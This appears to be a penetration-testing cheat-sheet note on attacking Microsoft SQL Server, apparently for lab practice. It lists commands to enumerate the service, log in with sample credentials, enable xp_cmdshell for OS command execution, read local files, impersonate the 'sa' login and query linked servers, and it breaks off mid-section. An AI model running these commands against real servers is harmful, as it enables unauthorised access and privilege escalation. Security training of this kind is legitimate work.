---
title: mssql
aliases: []
tags:
- tool/nmap
- tool/impacket
- tool/sqsh
- tool/sqlcmd
- tool/cmdss
- tool/xp_cmdshell
- tool/responder
- tool/sql-injection
category: tools
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: mssql.md
related_tools:
- '[[nmap-1787746090]]'
- '[[impacket]]'
- '[[sqsh]]'
- '[[sqlcmd]]'
- '[[cmdss]]'
- '[[xp_cmdshell]]'
- '[[responder]]'
related_techniques:
- '[[sql-injection]]'
related_tactics: []
related_services:
- '[[mssql]]'
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: '1433'
protocol: tcp
os: ''
---

# mssql

## Enumeration
- `nmap -Pn -sV -sC -p1433 $ip`

## Impacket
- `python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py <username>@$ip -windows-auth`
    - `enable_xp_cmdshell`
        - `xp_cmdshell whoami`

## sqsh
- `sqsh -S 10.129.20.13 -U username -P Password123`
    - `-h` disable headers for cleaner look
    - local account `sqsh -S $ip -U .\MSSQLSVC -P princess1`

## sqlcmd
- win `sqlcmd -S 10.129.20.13 -U username -P Password123`
    - `-y 30 -Y 30` shows better output but may impact performance

## cmdss
- may require `GO` to execute
    - list databases `SELECT name, database_id, create_date FROM sys.databases;`
    - list tables `SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES`
    - read local files `SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`
    - impersonate
        - find users`SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
        - `EXECUTE AS LOGIN = 'sa'`
    - linked servers `SELECT srvname, isremote FROM sysservers`
        - `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`

## xp_cmdshell
- `xp_cmdshell

